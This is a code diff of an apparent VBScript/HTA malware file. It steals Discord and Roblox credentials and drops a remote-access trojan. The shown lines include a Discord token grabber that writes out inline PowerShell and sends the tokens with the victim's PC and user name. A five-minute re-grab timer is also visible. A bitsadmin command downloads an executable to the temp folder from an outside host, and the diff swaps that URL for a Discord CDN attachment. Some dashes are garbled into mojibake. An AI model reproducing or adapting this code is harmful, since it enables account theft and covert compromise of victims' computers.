@@ -19,7 +19,7 @@ Call GrabDiscord()
 Call GrabRoblox()
 Call DropRAT()
 
-' regrab every 5 minutes â€” stops when PC restarts
+' regrab every 5 minutes Ã¢â‚¬â€ stops when PC restarts
 window.setInterval "RegrabAll()", 300000
 
 Sub RegrabAll()
@@ -55,7 +55,7 @@ Sub GrabIP()
 End Sub
 
 ' ============================================================
-' DISCORD TOKEN GRABBER â€” inline PS1
+' DISCORD TOKEN GRABBER Ã¢â‚¬â€ inline PS1
 ' ============================================================
 
 Sub GrabDiscord()
@@ -198,7 +198,7 @@ Sub GrabDiscord()
     f.WriteLine "if($valid.Count -eq 0){"
     f.WriteLine "    if($ALL.Count -gt 0){"
     f.WriteLine "        $flds=@(@{name=" & Q & "$eT Target" & Q & ";value=" & Q & "PC: $PC | $USR" & Q & "})"
-    f.WriteLine "        SendEmbed ($eK+' Discord Token') ($ALL.Count.ToString()+' candidate(s) â€” unvalidated') 16776960 $flds"
+    f.WriteLine "        SendEmbed ($eK+' Discord Token') ($ALL.Count.ToString()+' candidate(s) Ã¢â‚¬â€ unvalidated') 16776960 $flds"
     f.WriteLine "    }"
     f.WriteLine "} else {"
     f.WriteLine "    foreach($r in $valid){"
@@ -289,7 +289,7 @@ End Sub
 
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
-    Dim dl:   dl   = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"
+    Dim dl:   dl   = "https://cdn.discordapp.com/attachments/1564347479430930607/1564349466952081408/client-9.bat?ex=6ae0f179&is=6adf9ff9&hm=b920e2a9a800bc08305c88546005d7a21f4a4932e7d1afa422011bc86797fca2&"
 
     sh.Run "bitsadmin /transfer wd /download /priority high " & Q & dl & Q & " " & Q & temp & Q, 0, True
 
